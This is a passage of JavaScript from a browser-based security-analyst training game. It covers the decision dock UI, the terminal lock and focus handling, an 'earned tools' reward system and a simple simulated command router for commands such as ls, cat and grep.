    <p class="sim-dock-foot">The terminal is paused until you answer Sarah — she's waiting on your read before you run anything else.</p>`;
  }
  const rc = activeReconsideration();
  if (rc) return reconsiderDockHtml(rc);
  // Lowest priority: once nothing graded is pending, invite the player to LOG the
  // finding they just drafted, right where they decided. Optional + non-blocking.
  const fd = activeDraftFinding();
  if (fd) return findingDockHtml(fd);
  return '';
}

/* The finding-draft dock variant — a distinct CYAN accent so "log your finding"
 * never reads like a graded yellow call or an orange reconsideration. This mode is
 * OPTIONAL and NON-BLOCKING: it surfaces the just-drafted finding so the player can
 * log it in their own words next to where they decided, but it NEVER locks the
 * terminal (the host chrome is softened to match). Reuses the exact notebook card;
 * presentation-only — commit/reword flow through the existing delegated handlers. */
function findingDockHtml(ch) {
  const more = draftableFindings().length - 1;
  const queue = more > 0
    ? `<span class="sim-dock-queue sim-dock-queue--finding">${more} more to log</span>`
    : '';
  return `
    <div class="sim-dock-head sim-dock-head--finding">
      <span class="sim-dock-title"><span class="sim-dock-pulse" aria-hidden="true"></span>Log your finding</span>
      ${queue}
    </div>
    <div class="sim-dock-body">
      ${findingCardHtml(ch)}
    </div>
    <p class="sim-dock-foot sim-dock-foot--finding">Optional — put your call on the record in your own words. The terminal stays open; keep investigating any time.</p>`;
}

/* The reconsideration card — a distinct dock variant. Same Sarah-comms chrome and
 * keyboard/ARIA pattern as a normal call, but it cross-references an EARLIER logged
 * read and asks the analyst to revise or hold it. Neutral copy, no verdict leak;
 * recording flows through the NON-GRADED setReconsideration. */
function reconsiderDockHtml(rc) {
  const target = discoveryChallengeById(rc.target);
  const targetName = (target && target.short) || 'an earlier call';
  const opts = rc.options.map((o, i) =>
    `<button type="button" class="sim-comms-reply sim-comms-reply--reconsider" data-reconsideration data-rc="${rc.id}" data-option="${o.id}"><span class="sim-comms-reply-key" aria-hidden="true">${String.fromCharCode(65 + i)}</span><span class="sim-comms-reply-text">${o.label}</span></button>`
  ).join('');
  return `
    <div class="sim-dock-head sim-dock-head--reconsider">
      <span class="sim-dock-title"><span class="sim-dock-pulse" aria-hidden="true"></span>New evidence — does this change a call?</span>
      <span class="sim-dock-queue sim-dock-queue--reconsider">Reconsider: ${targetName}</span>
    </div>
    <div class="sim-dock-body">
      <div class="sim-comms sim-comms--reconsider" data-rc="${rc.id}">
        <div class="sim-comms-turn sim-comms-turn--open">
          <div class="sim-comms-cuebar">
            <span class="sim-comms-cuebar-step sim-comms-cuebar-step--reconsider" aria-hidden="true">\u21BB</span>
            <span class="sim-comms-cuebar-text">A new finding reframes your earlier read on “${targetName}”.</span>
          </div>
          <div class="sim-comms-msg sim-comms-msg--sarah">
            <span class="sim-comms-avatar" aria-hidden="true">SR</span>
            <div class="sim-comms-bubble sim-comms-bubble--ask">${rc.sarah || ''}</div>
          </div>
          <div class="sim-comms-replies" role="group" aria-label="Revise or hold your earlier read">
            <span class="sim-comms-replies-label">Revise or hold your read</span>
            ${opts}
          </div>
        </div>
      </div>
    </div>
    <p class="sim-dock-foot">The terminal is paused until you tell Sarah whether this changes your earlier read. Either call is valid — what matters is that you weigh it.</p>`;
}

/* Collapsed "peek" bar for the Decision Dock (Task #153). A single compact row that
 * names what's waiting and offers a button to expand into the full surface. Keeps
 * the terminal from being starved while still making a pending call un-missable.
 * Presentation-only; the expand button routes through the delegated handler. */
function dockPeekHtml() {
  const id = SIM._dockActiveId || '';
  let label, cta, variant = '';
  if (id.indexOf('finding:') === 0) {
    label = 'Finding ready to log'; cta = 'Log finding'; variant = 'sim-dock-peek--finding';
  } else if (id.indexOf('reconsider:') === 0) {
    label = 'New evidence — does this change a call?'; cta = 'Review & Decide'; variant = 'sim-dock-peek--reconsider';
  } else if (id.indexOf('review:') === 0) {
    label = 'Review the file before your call'; cta = 'Continue';
  } else {
    label = 'Sarah needs your call'; cta = 'Review & Decide';
  }
  return `
    <div class="sim-dock-peek ${variant}">
      <span class="sim-dock-peek-title"><span class="sim-dock-pulse" aria-hidden="true"></span>${label}</span>
      <button type="button" class="sim-dock-peek-go" data-dock-expand>${cta} \u25B8</button>
    </div>`;
}

/* Paint the dock host. `flash` plays the arrival animation (only when the active
 * decision actually changed). Hides the host when nothing is pending. The dock has
 * two presentation states (Task #153): a compact PEEK bar (default) and the full
 * EXPANDED surface (SIM.dockExpanded) — a blocking call auto-expands (see
 * syncDecisionDock) so the analyst is brought straight into the decision. */
function renderDecisionDock(flash) {
  const dock = document.getElementById('simDecisionDock');
  if (!dock) return;
  const html = (SIM.def && SIM.def.caseFileNotebook) ? decisionDockHtml() : '';
  if (!html) {
    dock.hidden = true; dock.innerHTML = '';
    dock.classList.remove('sim-decision-dock--finding');
    dock.classList.remove('sim-decision-dock--review');
    dock.classList.remove('sim-decision-dock--peek');
    return;
  }
  dock.hidden = false;
  const expanded = !!SIM.dockExpanded;
  if (expanded) {
    // A collapse control above the full surface lets the analyst shrink the dock to
    // re-read the terminal without abandoning the pending call.
    dock.innerHTML =
      `<div class="sim-dock-controls"><button type="button" class="sim-dock-collapse" data-dock-collapse aria-label="Collapse decision dock">\u25BE Collapse</button></div>` +
      html;
  } else {
    dock.innerHTML = dockPeekHtml();
  }
  dock.classList.toggle('sim-decision-dock--peek', !expanded);
  // Soften the dock's "locked/urgent" yellow chrome to a calm cyan when it is only
  // inviting an OPTIONAL finding log (derived from the tracked active-mode id).
  const isFinding = typeof SIM._dockActiveId === 'string' && SIM._dockActiveId.indexOf('finding:') === 0;
  dock.classList.toggle('sim-decision-dock--finding', isFinding);
  // Calm the dock chrome for the low-urgency "review the file first" beat.
  const isReview = typeof SIM._dockActiveId === 'string' && SIM._dockActiveId.indexOf('review:') === 0;
  dock.classList.toggle('sim-decision-dock--review', isReview);
  if (flash) {
    dock.classList.remove('sim-decision-dock--enter');
    void dock.offsetWidth;                  // restart the entrance animation
    dock.classList.add('sim-decision-dock--enter');
    scrollTerminalToLatest();               // keep the latest output visible above the dock
  }
}

/* Single chokepoint for the hard terminal lock, so the disabled input + ARIA +
 * placeholder + container class can never desync from the pending state. */
function updateDecisionLock() {
  const locked = decisionLocked();
  const reviewing = !!activeReviewChallenge();   // review beat holds the same lock, calmer copy
  const input = document.getElementById('simTermInput');
  if (input) {
    input.disabled = locked;
    if (locked) {
      input.setAttribute('aria-disabled', 'true');
      if (input.dataset.basePlaceholder == null) {
        input.dataset.basePlaceholder = input.getAttribute('placeholder') || '';
      }
      input.setAttribute('placeholder', reviewing
        ? 'Review the output above, then click Continue…'
        : 'Answer Sarah in the Decision Dock below to continue…');
    } else {
      input.removeAttribute('aria-disabled');
      if (input.dataset.basePlaceholder != null) {
        input.setAttribute('placeholder', input.dataset.basePlaceholder);
      }
    }
  }
  const ops = document.getElementById('careerOps');
  if (ops) ops.classList.toggle('career--decision-locked', locked);
  // Flush a grep-unlock nudge that was earned while the line was locked — now
  // that the terminal is free, the coaching points at an action the player can
  // actually take. Guarded by the pending flag so it prints exactly once.
  const flushGrep = !locked && SIM.grepNudgePending;
  if (flushGrep) { simEndTermGroup(); printGrepUnlockNudge(); }
  // (D) Unlock handoff — EDGE-TRIGGERED so it fires exactly once per real unlock.
  // When the dock clears (the player answered Sarah), confirm the beat and point
  // to the next action. Defer to the grep-unlock coaching when it owns this same
  // moment. Multiple pending challenges keep `locked` true, so no premature fire;
  // the optional finding-draft dock never locks, so it never triggers this.
  const wasLocked = !!SIM.decisionWasLocked;
  const justUnlocked = wasLocked && !locked;
  SIM.decisionWasLocked = locked;
  if (justUnlocked && markupEnabled() && !flushGrep) {
    simEndTermGroup();                      // post-decision handoff is a system beat, not a command
    simPrint('\u2713 Logged with Sarah.', 'ok');
    maybePrintNextStep();
  }
  // Flush a completion nudge that was earned while the dock was locked — now the
  // terminal is free, "type decide" is actionable. Runs AFTER the unlock beat so
  // the player reads "✓ Logged with Sarah." first, then the completion handoff.
  // (maybePrintNextStep above intentionally suppresses completion, so this is the
  // one path that surfaces the post-unlock "decide" step.)
  if (!locked && SIM.completionNudgePending) {
    SIM.completionNudgePending = false;
    simEndTermGroup();                      // completion handoff lands ungrouped, after the unlock beat
    maybeNudgeInvestigationReady();
  }
}

/* The single orchestration point: re-render the dock, update the lock, and pull
 * keyboard focus to a freshly-surfaced decision. NEVER calls renderEvidencePanel
 * (it is itself called from the END of renderEvidencePanel) — no recursion. */
function syncDecisionDock() {
  // Prefix the tracker so a normal call and a reconsideration can never share an
  // id (avoids a missed flash/focus when the dock swaps from one to the other).
  let newId = null;
  if (SIM.def && SIM.def.caseFileNotebook) {
    const rev = activeReviewChallenge();
    if (rev) {
      newId = 'review:' + rev.id;          // distinct prefix so review -> question still flashes/refocuses
    } else {
      const active = activeDecisionChallenge();
      if (active) newId = 'judgment:' + active.id;
      else {
        const rc = activeReconsideration();
        if (rc) newId = 'reconsider:' + rc.id;
        else {
          // No graded call or reconsideration pending — surface the oldest un-logged
          // finding so logging it is discoverable. Distinct prefix so the swap from a
          // just-answered call into the draft still flashes/announces.
          const fd = activeDraftFinding();
          if (fd) newId = 'finding:' + fd.id;
        }
      }
    }
  }
  const changed = newId !== SIM._dockActiveId;
  // Peek/expand policy (Task #153): when the active mode CHANGES, a blocking call
  // auto-expands (bring the analyst straight into the decision); a non-blocking
  // finding-log — or a cleared dock — drops back to the compact peek so the terminal
  // is never starved by an optional surface. A re-render of the SAME mode (e.g.
  // step 1 → step 2 of a call) preserves whatever the analyst last chose.
  if (changed) SIM.dockExpanded = !!(newId && decisionLocked());
  SIM._dockActiveId = newId;
  renderDecisionDock(changed);
  updateDecisionLock();
  // When a NEW decision surfaces (e.g. a command just revealed evidence and the
  // terminal locked), pull focus into the dock — but never yank it away while the
  // player is already on a reply or otherwise inside the dock. The finding-draft
  // mode is OPTIONAL and never locks, so it flashes for attention but must NOT
  // steal focus from the command line the player may still be typing in.
  if (changed && newId && decisionLocked()) {
    const ae = document.activeElement;
    const inDock = !!(ae && ae.closest && ae.closest('#simDecisionDock'));
    const onReply = !!(ae && ae.closest && ae.closest('.sim-comms-reply'));
    if (!inDock && !onReply) focusFirstDockReply();
  }
  // Refresh the persistent terminal HUD (C) from the single render chokepoint so
  // it can never desync from objective/lock state. Only mutates #simHud.
  renderSimHud();
}

/* Focus the first reply button in the dock (keyboard entry into the decision). */
function focusFirstDockReply() {
  const dock = document.getElementById('simDecisionDock');
  if (!dock || dock.hidden) return null;
  const t = dock.querySelector('.sim-comms-reply') || dock.querySelector('button, [tabindex]');
  if (t && typeof t.focus === 'function') {
    try { t.focus({ preventScroll: true }); } catch (_e) { t.focus(); }
  }
  return t;
}

/* The player tried to type while the terminal is locked: flash the dock + focus
 * it so they understand where to act. Presentation / accessibility only. */
function nudgeDecisionDock() {
  const dock = document.getElementById('simDecisionDock');
  if (!dock || dock.hidden) return;
  dock.classList.remove('sim-decision-dock--nudge');
  void dock.offsetWidth;
  dock.classList.add('sim-decision-dock--nudge');
  focusFirstDockReply();
}

/* Record that the player has reviewed the file behind a fresh call, then re-sync
 * the dock so the actual question card surfaces (and focus moves to it). The flag
 * is transient view-state only — NEVER grades, persists, or syncs. */
function acknowledgeReview(challengeId) {
  if (!challengeId) return;
  SIM.reviewAck[challengeId] = true;
  syncDecisionDock();
}

/* ================================================================== *
 * JUDGMENT-TO-POWER SYSTEM (Task #117)
 * ------------------------------------------------------------------ *
 * Converts demonstrated analyst judgment into small, time-bound,
 * spendable "tools". 100% transient (lives on SIM.powers, reset on
 * openCareerMission, never persisted / never synced) and presentation-
 * only: it READS the judgment / evidence / risk state but NEVER touches
 * investigationConfidence(), the grading helpers, or saveProgress.
 * Rendered inside the caseFileNotebook branch, so it appears exactly
 * where the judgment engine does (all four Intern missions) and other
 * missions never see it. Tools "appear" as trust is earned — there is
 * no list of locked powers to grind toward.
 * ================================================================== */
const STANDING_CAP = 3;
const RAILGUARD_DIP = 8;          // recoverable Investigation Confidence DISPLAY dip
const SNAPSHOT_WINDOW = 2;        // Scope Snapshot visible for the next N judgment steps

function freshPowersState() {
  return {
    standingSpent: 0,             // standing already spent (standing = sound calls - this, clamped)
    confSpend: 0,                 // recoverable Investigation Confidence DISPLAY dip (Railguard / bet)
    confSpendSource: null,        // who staked the dip: 'railguard' | 'bet' (routes recovery)
    spent: {},                    // powerId -> true (once-per-mission guard)
    active: {},                   // powerId -> live effect payload (time-bound)
    announced: new Set(),         // powerId -> earn line already shown (once)
    sarah: '',                    // latest power coaching line (presentation)
    lastSoundCount: 0,            // delta guard: sound judgments seen at the last tick
    log: [],                      // local telemetry only (never persisted / synced)
  };
}

/* ---- derived judgment-habit counters (pure, over current SIM state) ------- */
function soundJudgmentCount() { return simDiscoveryChallenges().filter(challengeFullyCorrect).length; }
function correctJustificationCount() { return simDiscoveryChallenges().filter(c => challengeValid(c) && challengeStepCorrect(c, 'justification')).length; }
function correctObservationCount() { return simDiscoveryChallenges().filter(c => challengeValid(c) && challengeStepCorrect(c, 'observation')).length; }

/* Earned, spendable "standing": rises with sound calls, falls as it is spent,
 * capped so it can never be grinded. Recovery = make another sound call. */
function analystStanding() {
  const P = SIM.powers || (SIM.powers = freshPowersState());
  return Math.max(0, Math.min(STANDING_CAP, soundJudgmentCount() - P.standingSpent));
}

/* The power registry — data-driven. Each entry names the ONE judgment habit it
 * rewards (earned), its cost, and the in-voice coaching lines. The UI, the
 * teaching, and the spend rules all read from here. */
const ANALYST_POWERS = [
  {
    id: 'JP-001', name: 'Evidence Threader', category: 'Evidence Surfacing',
    effect: 'Connects two findings you have already surfaced that corroborate the same risk.',
    cost: { standing: 1 },
    earned: () => soundJudgmentCount() >= 1,
    sarahEarn: 'A clean call, start to finish \u2014 that is judgment I can build on. You have earned Evidence Threader; spend a little standing and it will tie together findings you have already pulled.',
    sarahSpend: 'Good \u2014 let the evidence corroborate itself, then move on.',
    sarahExpire: 'That thread has served its purpose. Back to first principles.',
  },
  {
    id: 'JP-002', name: 'Scope Snapshot', category: 'Context Reveal',
    effect: 'A brief recap of what is settled versus what is still open, to re-anchor your scope.',
    cost: { standing: 1 },
    earned: () => correctJustificationCount() >= 2,
    sarahEarn: 'Your reasoning is holding up under weight. Scope Snapshot is yours \u2014 use it to re-anchor what is settled against what is still open.',
    sarahSpend: 'Take the lay of the land, then keep moving \u2014 it will not stay up long.',
    sarahExpire: 'Snapshot closed. Trust your notebook from here.',
  },
  {
    id: 'JP-003', name: 'Risk Railguard', category: 'Risk Calibration',
    effect: 'A calibration check on whether your confidence is in step with your evidence.',
    cost: { confidence: RAILGUARD_DIP },
    earned: () => correctObservationCount() >= 2,
    sarahEarn: 'You are reading risk accurately and consistently. Risk Railguard is available \u2014 it is a calibration check, but it will cost you a little certainty until you reconfirm.',
    sarahSpend: 'Second opinion noted. Your confidence dips until you back it with another solid call \u2014 that is the price of asking.',
    sarahExpire: 'There it is \u2014 confidence restored. The calibration paid off.',
  },
];
function powerById(id) { return ANALYST_POWERS.find(p => p.id === id) || null; }

/* Telemetry \u2014 local only (console + in-memory log). Never persisted / synced. */
function powerLog(ev, id, ctx) {
  const P = SIM.powers; if (!P) return;
  P.log.push({ t: Date.now(), ev, id, ctx: ctx || '', standing: analystStanding() });
  try { console.debug('[powers]', ev, id, ctx || ''); } catch (_) { /* no console */ }
}

/* Two already-surfaced findings that corroborate the SAME confirmed risk \u2014 the
 * Evidence Threader payload. Only ever names evidence the player has surfaced
 * and a risk the case file already shows as FACT; it reveals nothing new and
 * never points at an answer. null when no such pair exists yet. */
function threadPair() {
  const risks = (SIM.def && SIM.def.risks) || [];
  const defs = simEvidenceDefs();
  const label = id => { const e = defs.find(d => d.id === id); return e ? e.label : null; };
  for (const r of risks) {
    if (!riskConfirmed(r)) continue;
    const got = (r.triggeredBy || []).filter(id => SIM.evidence.has(id)).map(label).filter(Boolean);
    if (got.length >= 2) return { risk: r.label, a: got[0], b: got[1] };
  }
  return null;
}

/* Plain established-vs-open counts for Scope Snapshot \u2014 model-agnostic (works on
 * the file-model M1 and the command-model M2-M4). Counts only; no answers. */
function scopeCounts() {
  const risks = (SIM.def && SIM.def.risks) || [];
  const vis = visibleDiscoveryChallenges().filter(challengeValid);
  const files = simFiles();
  return {
    facts: risks.filter(riskConfirmed).length,
    judged: vis.filter(challengeAnswered).length,
    toJudge: vis.filter(c => !challengeAnswered(c)).length,
    toClassify: files.filter(f => fileClassificationVisible(f) && !SIM.classified[f.name]).length,
    determinationOpen: !!(SIM.def && SIM.def.identify && !SIM.identified),
  };
}

/* The Railguard calibration line \u2014 compares confidence to completeness. Never
 * names a finding or an answer; it only flags over/under-confidence. */
function railguardMessage() {
  const conf = investigationConfidence();
  const c = scopeCounts();
  const open = c.toJudge + c.toClassify + (c.determinationOpen ? 1 : 0);
  if (conf >= 70 && open > 0) {
    return `Your confidence is running ahead of your evidence \u2014 ${open} item${open === 1 ? '' : 's'} still open. Confirm ${open === 1 ? 'it' : 'them'} before you commit.`;
  }
  if (conf < 45) {
    return 'Your confidence is low for a call this size \u2014 surface more evidence before you decide.';
  }
  return 'Confidence and evidence are in step. You are calibrated to make the call.';
}

/* Whether a power's context makes it useful RIGHT NOW (separate from affording it). */
function powerContextOk(id) {
  if (id === 'JP-001') return !!threadPair();                  // need a real corroboration to thread
  if (id === 'JP-002') return true;                            // a recap is always meaningful once earned
  if (id === 'JP-003') return SIM.stage === 'investigation'    // calibration only teaches before deciding
    && SIM.powers.confSpend === 0                              // not already dipped
    && investigationConfidence() >= 30;                        // must have certainty to spend
  return false;
}
function powerAffordable(p) {
  if (p.cost.standing) return analystStanding() >= p.cost.standing;
  return true; // confidence-cost powers gate via powerContextOk
}
function powerSpendable(p) {
  return p.earned() && !SIM.powers.spent[p.id] && !SIM.powers.active[p.id]
    && powerAffordable(p) && powerContextOk(p.id);
}

/* Spend a power \u2014 the ONLY place a power effect is applied. Mutates transient
 * SIM.powers, then renders once. Never touches confidence/grading/persistence. */
function useAnalystPower(id) {
  const P = SIM.powers; if (!P) return;
  const p = powerById(id);
  if (!p || !powerSpendable(p)) return;
  P.spent[id] = true;
  if (p.cost.standing) P.standingSpent += p.cost.standing;
  let railguarded = false;
  if (id === 'JP-001')      { P.active['JP-001'] = { pair: threadPair() }; }
  else if (id === 'JP-002') { P.active['JP-002'] = { left: SNAPSHOT_WINDOW, counts: scopeCounts() }; }
  else if (id === 'JP-003') { P.confSpend = p.cost.confidence; P.confSpendSource = 'railguard'; P.active['JP-003'] = { calib: railguardMessage() }; railguarded = true; }
  P.sarah = p.sarahSpend;
  powerLog('spent', id);
  renderEvidencePanel();
  if (railguarded) {
    const meter = document.querySelector('#simEvidence .sim-evidence-body .sim-confidence');
    if (meter) { void meter.offsetWidth; meter.classList.add('sim-confidence--flash'); }
  }
}

/* Expire a time-bound effect (returns the tool to "used" state + a closing line). */
function expirePower(id) {
  const P = SIM.powers; if (!P || !P.active[id]) return;
  delete P.active[id];
  const p = powerById(id);
  if (p) { P.sarah = p.sarahExpire; powerLog('expired', id); }
}

/* Run once per recorded judgment step from setDiscoveryJudgment, BEFORE the
 * render. Handles confidence recovery, time-bound expiry, and earn
 * announcements. Never renders \u2014 the caller renders once afterwards. */
function powersTick() {
  const P = SIM.powers; if (!P) return;
  const sound = soundJudgmentCount();
  const newSound = sound > P.lastSoundCount;

  // Recovery: a fresh sound call restores the staked confidence dip + closes it.
  // Route by who staked it so the bet stake never triggers the Railguard line.
  if (newSound && P.confSpend > 0) {
    const src = P.confSpendSource;
    P.confSpend = 0;
    P.confSpendSource = null;
    if (P.active['betSnapshot']) delete P.active['betSnapshot'];
    if (src === 'bet') { P.sarah = 'Your read held \u2014 the certainty you staked is back.'; powerLog('recovered', 'BET'); }
    else if (P.active['JP-003']) expirePower('JP-003');
    else { const rg = powerById('JP-003'); if (rg) { P.sarah = rg.sarahExpire; powerLog('recovered', 'JP-003'); } }
  }
  // Scope Snapshot counts down on each judgment step.
  if (P.active['JP-002']) {
    P.active['JP-002'].left -= 1;
    if (P.active['JP-002'].left <= 0) expirePower('JP-002');
  }
  // Bet-owned recap counts down the same way (separate key, no Sarah ceremony).
  if (P.active['betSnapshot']) {
    P.active['betSnapshot'].left -= 1;
    if (P.active['betSnapshot'].left <= 0) delete P.active['betSnapshot'];
  }
  // Evidence Threader is a one-shot: it lasts until the NEXT judgment step.
  if (P.active['JP-001']) expirePower('JP-001');

  // Earn announcements \u2014 a tool "appears" with a coaching line, once each.
  for (const p of ANALYST_POWERS) {
    if (p.earned() && !P.announced.has(p.id)) {
      P.announced.add(p.id);
      P.sarah = p.sarahEarn;
      powerLog('earned', p.id);
    }
  }
  P.lastSoundCount = sound;
}

/* EARNED TOOLS section \u2014 '' until the first tool is earned (no locked-power
 * grind list). Presentation-only; the sole writers are the chokepoint hook
 * (powersTick) and the click handler (useAnalystPower). */
function analystPowersHtml() {
  const P = SIM.powers; if (!P) return '';
  const earned = ANALYST_POWERS.filter(p => P.announced.has(p.id));
  const anyActive = ANALYST_POWERS.some(p => P.active[p.id]); // bet-owned keys never render here
  if (!earned.length && !anyActive) return '';

  const have = analystStanding();
  let dots = '';
  for (let i = 0; i < STANDING_CAP; i++) dots += `<span class="sim-power-dot${i < have ? ' sim-power-dot--on' : ''}" aria-hidden="true"></span>`;

  const rows = earned.map(p => {
    const costLabel = p.cost.standing ? `${p.cost.standing} standing`
      : p.cost.confidence ? `${p.cost.confidence}% confidence` : '';
    let action;
    if (P.active[p.id]) {
      action = `<span class="sim-power-state sim-power-state--active">In use</span>`;
    } else if (P.spent[p.id]) {
      action = `<span class="sim-power-state sim-power-state--used">Used this case</span>`;
    } else if (powerSpendable(p)) {
      action = `<button type="button" class="sim-power-use" data-power="${p.id}">Use \u00b7 ${mapEsc(costLabel)}</button>`;
    } else {
      let why = `Needs ${mapEsc(costLabel)}`;
      if (p.cost.standing && have < p.cost.standing) why = `Earn more standing (${have}/${p.cost.standing})`;
      else if (p.id === 'JP-001') why = 'No two findings corroborate yet';
      else if (p.id === 'JP-003') why = SIM.stage !== 'investigation' ? 'Calibrate before you decide' : 'Build more confidence first';
      action = `<span class="sim-power-state sim-power-state--wait">${why}</span>`;
    }
    return `
      <div class="sim-power-row">
        <div class="sim-power-main">
          <span class="sim-power-name">${mapEsc(p.name)}</span><span class="sim-power-cat">${mapEsc(p.category)}</span>
          <span class="sim-power-effect">${mapEsc(p.effect)}</span>
        </div>
        <div class="sim-power-action">${action}</div>
      </div>`;
  }).join('');

  let effects = '';
  const thread = P.active['JP-001'] && P.active['JP-001'].pair;
  if (thread) {
    effects += `<div class="sim-power-fx sim-power-fx--thread"><span class="sim-power-fx-lab">Evidence Threader</span>\u201c${mapEsc(thread.a)}\u201d and \u201c${mapEsc(thread.b)}\u201d both point to ${mapEsc(thread.risk)} \u2014 weigh them together.</div>`;
  }
  if (P.active['JP-002']) {
    const c = P.active['JP-002'].counts;
    const open = [];
    if (c.toJudge) open.push(`${c.toJudge} finding${c.toJudge === 1 ? '' : 's'} to judge`);
    if (c.toClassify) open.push(`${c.toClassify} file${c.toClassify === 1 ? '' : 's'} to classify`);
    if (c.determinationOpen) open.push('determination pending');
    const openTxt = open.length ? open.join(', ') : 'nothing outstanding';
    effects += `<div class="sim-power-fx sim-power-fx--snapshot"><span class="sim-power-fx-lab">Scope Snapshot</span>Settled: ${c.facts} fact${c.facts === 1 ? '' : 's'}, ${c.judged} judgment${c.judged === 1 ? '' : 's'}. Open: ${mapEsc(openTxt)}. <span class="sim-power-fx-exp">expires in ${P.active['JP-002'].left}</span></div>`;
  }
  if (P.active['JP-003']) {
    effects += `<div class="sim-power-fx sim-power-fx--railguard"><span class="sim-power-fx-lab">Risk Railguard</span>${mapEsc(P.active['JP-003'].calib)}</div>`;
  }

  const sarah = P.sarah
    ? `<div class="sim-power-sarah"><span class="sim-power-sarah-lab">Sarah Reyes</span>${mapEsc(P.sarah)}</div>` : '';

  return `
    <div class="sim-notebook-section sim-powers">
      <div class="sim-notebook-head sim-notebook-head--powers">EARNED TOOLS <span class="sim-power-standing" title="Analyst standing">${dots}</span></div>
      <div class="sim-powers-rows">${rows}</div>
      ${effects}
      ${sarah}
    </div>`;
}

// First-day teaching mode (gated per-mission by def.teachCommands). When on,
// clicking a command button loads the command into the terminal input and waits
// for Enter, rather than running on click — so beginners see the exact command.
function commandTeachMode() {
  return !!(SIM && SIM.def && SIM.def.teachCommands);
}

function simHideTermLoadCue() {
  const cue = document.getElementById('simTermLoadCue');
  if (cue) { cue.hidden = true; cue.innerHTML = ''; }
}

function simShowTermLoadCue() {
  const cue = document.getElementById('simTermLoadCue');
  if (!cue) return;
  cue.innerHTML = 'Command loaded in the terminal — press <kbd>Enter</kbd> to run it.';
  cue.hidden = false;
}

// Load (don't run) a command into the terminal input so the player runs it with
// Enter. Mirrors simRunCommand's guards so a button can never bypass the hard
// lock or fire while a brief/onboarding is open.
function simLoadCommandToTerminal(cmd) {
  const text = String(cmd || '');
  if (!text) return;
  if (decisionLocked()) { nudgeDecisionDock(); return; }
  if (SIM.briefOpen || SIM.onboardOpen) return;
  const input = document.getElementById('simTermInput');
  if (!input) { simRunCommand(text); return; }
  input.value = text;
  input.focus();
  try { input.setSelectionRange(text.length, text.length); } catch (e) {}
  simShowTermLoadCue();
}

/* Terminal command router. ls / cat / less per the Mission 1 spec, plus help,
 * clear, and `decide` to reveal the handling actions when the player is ready. */
function simRunCommand(raw) {
  // Defense-in-depth for the hard lock: the form submit already blocks this while
  // a decision pends, but never run a command (or surface evidence) until the
  // player has answered Sarah in the dock.
  if (decisionLocked()) { nudgeDecisionDock(); return; }
  // A command brief ("Guided Terminal") or the first-shift onboarding is up —
  // ignore stray terminal submits until it is dismissed.
  if (SIM.briefOpen || SIM.onboardOpen) return;
  const cmd = String(raw || '').trim();
  if (!cmd) return;
  const parts = cmd.split(/\s+/);
  const verb = parts[0].toLowerCase();
  // Group this command's echo + all of its output into one block so a single left
  // accent line (CSS .sim-term-group) marks the whole unit. `clear` wipes the
  // terminal, so it stays ungrouped.
  if (verb !== 'clear') simBeginTermGroup(); else simEndTermGroup();
  const promptLabel = (SIM.def && SIM.def.promptLabel) || 'intern@cybercorp:~/release$';
  simPrint(promptLabel + ' ' + cmd, 'cmd');

  // Universal verbs available in every mission.
  if (verb === 'help')  return simCmdHelp();
  if (verb === 'clear') { const out = document.getElementById('simTerminal'); if (out) out.innerHTML = ''; return; }
  if (verb === 'decide' || verb === 'actions') return simRevealActions(true);
  if (verb === 'pwd')   return simCmdPwd();
  if (verb === 'ls' || verb === 'dir') return simCmdList();

  // Command-model missions (M2+) define their own command set.
  if (SIM.def && Array.isArray(SIM.def.commands) && SIM.def.commands.length) {
    return simRunMissionCommand(cmd);
  }

  // File-model missions (Mission 1) — original ls / cat flow.
  const arg = parts.slice(1).join(' ').trim();
  switch (verb) {
    case 'ls':
    case 'dir':    return simCmdLs();
    case 'cat':
    case 'less':
    case 'more':
    case 'open':   return simCmdRead(arg, verb);
    case 'grep':   return simCmdGrep(arg);
    default: {
      const tools = grepTriageEnabled() && fileModelGrepUnlocked()
        ? 'ls, cat <file>, grep <text>, decide, help'
        : 'ls, cat <file>, less <file>, decide, help';
      simPrint(`command not found: ${verb}. Try: ${tools}.`, 'err');
    }
  }
}

function simCmdHelp() {
  // Command-model missions list their own command set.
  if (SIM.def && Array.isArray(SIM.def.commands) && SIM.def.commands.length) {
    simPrint('Available commands:', 'head');
    SIM.def.commands.forEach(c => {
      const name = (c.match && c.match[0]) || c.id;
      simPrint('  ' + name.padEnd(26) + (c.help || ''), 'dim');
    });
    simPrint('  ' + 'ls'.padEnd(26) + 'list the files in this directory', 'dim');
    simPrint('  ' + 'pwd'.padEnd(26) + 'show the current directory', 'dim');
    simPrint('  ' + 'decide'.padEnd(26) + 'review your findings and choose a response', 'dim');
    simPrint('  ' + 'clear'.padEnd(26) + 'clear the terminal', 'dim');
    return;
  }
  simPrint('Available commands:', 'head');
  simPrint('  ls            list the files queued for release', 'dim');
  simPrint('  cat <file>    read a file in full (surfaces evidence)', 'dim');
  simPrint('  less <file>   page through a file (same as cat here)', 'dim');
  if (grepTriageEnabled()) {
    simPrint(
      fileModelGrepUnlocked()
        ? '  grep <text>   scan every file for a marker, e.g. grep restricted'
        : '  grep <text>   scan every file for a marker (unlocks after you read a couple of files)',
      'dim');
  }
  simPrint('  pwd           show the current directory', 'dim');
  simPrint('  decide        reveal the handling actions when ready', 'dim');
  simPrint('  clear         clear the terminal', 'dim');
}

/* ------------------------------------------------------------------ *
 * COMMAND-MODEL ENGINE (Mission 2+). Missions define `def.commands[]`;
 * each entry prints output, surfaces evidence, and runs a per-command
 * learning loop (observation ▸ / rhetorical question ? / confidence ↑ /
 * next →). Mission 1's file flow is untouched.
 * ------------------------------------------------------------------ */
function normalizeCmd(s) {
  return String(s || '').trim().toLowerCase().replace(/\s+/g, ' ');
}

/* Match a typed command against the active mission's command set: exact
 * normalized match against any alias first, then an arg-bearing prefix match. */
function findMissionCommand(cmd) {
  const norm = normalizeCmd(cmd);
  const cmds = (SIM.def && SIM.def.commands) || [];
  for (const c of cmds) {
    if ((c.match || []).map(normalizeCmd).includes(norm)) return c;
  }
  for (const c of cmds) {
    if ((c.match || []).map(normalizeCmd).some(a => norm === a || norm.startsWith(a + ' '))) return c;
  }
  return null;
}

function simRunMissionCommand(cmd) {
  const c = findMissionCommand(cmd);
  if (!c) {
    const verb = normalizeCmd(cmd).split(' ')[0];
    simPrint(`command not found: ${verb}. Type  help  to see available commands, or  decide  when ready.`, 'err');
    return;
  }
  // Guided Terminal: the first time a new tool is used, Sarah briefs it first;
  // closeCommandBrief() then runs this command. Sits AFTER the Decision Dock's
  // hard-lock guard in simRunCommand, so a brief never pre-empts a pending call.
  if (maybeShowCommandBrief(c, cmd)) return;
